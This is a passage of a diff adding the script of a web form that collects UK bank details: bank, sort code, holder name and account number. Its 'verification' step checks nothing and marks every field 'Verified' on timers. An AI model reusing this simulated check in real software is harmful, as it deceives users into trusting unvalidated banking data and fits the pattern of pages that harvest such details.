+            const documentHeight = document.documentElement.scrollHeight;
+            const scrollTo = (documentHeight - windowHeight) / 2;
+            
+            window.scrollTo({
+                top: Math.max(0, scrollTo),
+                behavior: 'smooth'
+            });
+        }
+
+        function showLoadingWithCenterScroll(callback, delayTime = 2500) {
+            const overlay = document.getElementById('loadingOverlay');
+            
+            scrollToCenter();
+            
+            setTimeout(() => {
+                overlay.classList.add('active');
+            }, 300);
+            
+            setTimeout(() => {
+                overlay.classList.remove('active');
+                if (callback) callback();
+            }, delayTime);
+        }
+
+        function scrollToTop() {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        }
+
+        const sections = {
+            s1: document.getElementById('section-1'),
+            s2: document.getElementById('section-2'),
+            s3: document.getElementById('section-3')
+        };
+
+        const goToStep2 = document.getElementById('goToStep2');
+        const backToStep1 = document.getElementById('backToStep1');
+        const backToStep2 = document.getElementById('backToStep2');
+        const runVerify = document.getElementById('runVerification');
+        const confirmStep2 = document.getElementById('confirmStep2');
+
+        const bankDisplay = document.getElementById('selectedBank');
+        const sortInput = document.getElementById('sortCode');
+        const holderInput = document.getElementById('holderName');
+        const accInput = document.getElementById('accountNumber');
+
+        const badgeBank = document.getElementById('badgeBank');
+        const badgeSort = document.getElementById('badgeSort');
+        const badgeHolder = document.getElementById('badgeHolder');
+        const badgeAcc = document.getElementById('badgeAcc');
+
+        const verifiedMessage = document.getElementById('verifiedMessage');
+
+        const iconBank = document.getElementById('iconBank');
+        const iconSort = document.getElementById('iconSort');
+        const iconHolder = document.getElementById('iconHolder');
+        const iconAcc = document.getElementById('iconAcc');
+        const gBank = document.getElementById('gBank');
+        const gSort = document.getElementById('gSort');
+        const gHolder = document.getElementById('gHolder');
+        const gAcc = document.getElementById('gAcc');
+        const sumBank = document.getElementById('sumBank');
+        const sumSort = document.getElementById('sumSort');
+        const sumHolder = document.getElementById('sumHolder');
+        const sumAcc = document.getElementById('sumAcc');
+
+        const relBank = document.getElementById('relBank');
+        const relSort = document.getElementById('relSort');
+        const relAcc = document.getElementById('relAcc');
+
+        const bankTrigger = document.getElementById('bankTrigger');
+        const bankDropdown = document.getElementById('bankDropdown');
+        const bankSearch = document.getElementById('bankSearch');
+        const bankOptions = document.querySelectorAll('.bank-option');
+        
+        const galleryHeader = document.getElementById('galleryHeader');
+        const galleryItems = document.getElementById('galleryItems');
+        const galleryChevron = document.getElementById('galleryChevron');
+
+        function areAllFieldsFilled() {
+            const bank = bankDisplay.innerText !== 'Select bank';
+            const sort = sortInput.value.trim() !== '';
+            const holder = holderInput.value.trim() !== '';
+            const acc = accInput.value.trim() !== '';
+            
+            const sortValid = sortInput.value.replace(/[^0-9]/g,'').length === 6;
+            
+            return bank && sort && sortValid && holder && acc;
+        }
+
+        function refreshSummaries() {
+            const bank = bankDisplay.innerText === 'Select bank' ? '-' : bankDisplay.innerText;
+            const sort = sortInput.value || '-';
+            const holder = holderInput.value || '-';
+            const acc = accInput.value || '-';
+
+            gBank.innerText = bank; 
+            gSort.innerText = sort; 
+            gHolder.innerText = holder; 
+            gAcc.innerText = acc;
+            
+            sumBank.innerText = bank;
+            sumSort.innerText = sort;
+            sumHolder.innerText = holder;
+            sumAcc.innerText = acc;
+
+            if (relBank) relBank.innerText = bank;
+            if (relSort) relSort.innerText = sort;
+            if (relAcc) relAcc.innerText = acc;
+        }
+
+        function resetVerificationToPending() {
+            badgeBank.innerText = 'Pending'; badgeBank.className = 'badge badge--pending';
+            badgeSort.innerText = 'Pending'; badgeSort.className = 'badge badge--pending';
+            badgeHolder.innerText = 'Pending'; badgeHolder.className = 'badge badge--pending';
+            badgeAcc.innerText = 'Pending'; badgeAcc.className = 'badge badge--pending';
+
+            iconBank.className = 'status-dot'; iconBank.innerText = '○';
+            iconSort.className = 'status-dot'; iconSort.innerText = '○';
+            iconHolder.className = 'status-dot'; iconHolder.innerText = '○';
+            iconAcc.className = 'status-dot'; iconAcc.innerText = '○';
+
+            verifiedMessage.style.display = 'none';
+            confirmStep2.disabled = true;
+        }
+
+        function runFullVerification() {
+            if (!areAllFieldsFilled()) {
+                alert('Please fill in all fields correctly before running verification:\n\n- Select a bank\n- Enter a valid 6-digit sort code (00-00-00)\n- Enter account holder name\n- Enter account number');
+                return;
+            }
+
+            runVerify.disabled = true;
+            runVerify.innerHTML = '<span class="spinner"></span> Verifying...';
+
+            badgeBank.innerText = 'Pending'; badgeBank.className = 'badge badge--pending';
+            badgeSort.innerText = 'Pending'; badgeSort.className = 'badge badge--pending';
+            badgeHolder.innerText = 'Pending'; badgeHolder.className = 'badge badge--pending';
+            badgeAcc.innerText = 'Pending'; badgeAcc.className = 'badge badge--pending';
+
+            iconBank.className = 'status-dot'; iconBank.innerText = '○';
+            iconSort.className = 'status-dot'; iconSort.innerText = '○';
+            iconHolder.className = 'status-dot'; iconHolder.innerText = '○';
+            iconAcc.className = 'status-dot'; iconAcc.innerText = '○';
+
+            verifiedMessage.style.display = 'none';
+            confirmStep2.disabled = true;
+
+            const steps = [
+                { badge: badgeBank, icon: iconBank },
+                { badge: badgeSort, icon: iconSort },
+                { badge: badgeHolder, icon: iconHolder },
+                { badge: badgeAcc, icon: iconAcc }
+            ];
+
+            let index = 0;
+            function applyNext() {
+                if (index >= steps.length) {
+                    runVerify.disabled = false;
+                    runVerify.innerHTML = 'Run Verification';
+                    verifiedMessage.style.display = 'block';
+                    confirmStep2.disabled = false;
+                    return;
+                }
+                const step = steps[index];
+                step.badge.innerText = 'Verified';
+                step.badge.className = 'badge badge--verified';
+                step.icon.className = 'status-dot verified';
+                step.icon.innerText = '✓';
+                index++;
+                setTimeout(applyNext, 2000);
+            }
+            
+            setTimeout(applyNext, 500);
+        }
+
+        sortInput.addEventListener('input', function(e) {
+            let v = e.target.value.replace(/[^0-9]/g,'').slice(0,6);
+            if (v.length > 4) v = v.slice(0,2)+'-'+v.slice(2,4)+'-'+v.slice(4,6);
+            else if (v.length > 2) v = v.slice(0,2)+'-'+v.slice(2);
+            e.target.value = v;
+            refreshSummaries();
+            resetVerificationToPending();
+        });
+
+        accInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g,'').slice(0,8);
+            refreshSummaries();
+            resetVerificationToPending();
+        });
+
+        holderInput.addEventListener('input', function() {
+            refreshSummaries();
+            resetVerificationToPending();
+        });
+
+        bankOptions.forEach(opt => {
+            opt.addEventListener('click', function() {
+                bankDisplay.innerText = this.getAttribute('data-bank') || this.innerText;
+                bankDropdown.classList.remove('open');
+                bankOptions.forEach(o => o.classList.remove('selected'));
+                this.classList.add('selected');
+                refreshSummaries();
+                resetVerificationToPending();
+            });
+        });
+
+        bankTrigger.addEventListener('click', (e) => {
+            e.stopPropagation();
+            bankDropdown.classList.toggle('open');
+        });
+
+        bankSearch.addEventListener('input', (e) => {
+            const term = e.target.value.toLowerCase();
+            bankOptions.forEach(o => {
+                o.style.display = o.innerText.toLowerCase().includes(term) ? 'block' : 'none';
+            });
+        });
+
+        document.addEventListener('click', (e) => {
+            if (!bankTrigger.contains(e.target) && !bankDropdown.contains(e.target)) {
+                bankDropdown.classList.remove('open');
+            }
+        });
+
+        galleryHeader.addEventListener('click', () => {
+            galleryItems.classList.toggle('expanded');
+            galleryChevron.innerText = galleryItems.classList.contains('expanded') ? '⌄' : '›';
+        });
+
+        goToStep2.addEventListener('click', () => {
+            showLoadingWithCenterScroll(() => {
+                sections.s1.classList.add('hidden');
+                sections.s2.classList.remove('hidden');
+                sortInput.value = '';
+                holderInput.value = '';
+                accInput.value = '';
+                bankDisplay.innerText = 'Select bank';
+                refreshSummaries();
+                resetVerificationToPending();
+                scrollToTop(); 
+            }, 2500);
+        });
+
+        backToStep1.addEventListener('click', () => {
+            sections.s2.classList.add('hidden');
+            sections.s1.classList.remove('hidden');
+            scrollToTop();
+        });
+
+        backToStep2.addEventListener('click', () => {
+            sections.s3.classList.add('hidden');
+            sections.s2.classList.remove('hidden');
+            scrollToTop();
+        });
+
+        confirmStep2.addEventListener('click', () => {
+            showLoadingWithCenterScroll(() => {
+                sections.s2.classList.add('hidden');
+                sections.s3.classList.remove('hidden');
+                refreshSummaries();
+                scrollToTop(); 
+            }, 2500);
+        });
+
+        runVerify.addEventListener('click', runFullVerification);
+
+        bankDisplay.innerText = 'Select bank'; 
+        sortInput.value = '';
+        holderInput.value = '';
+        accInput.value = '';
+        refreshSummaries();
+        resetVerificationToPending();
+        confirmStep2.disabled = true;
+    })();
+</script>
+</body>
+</html>
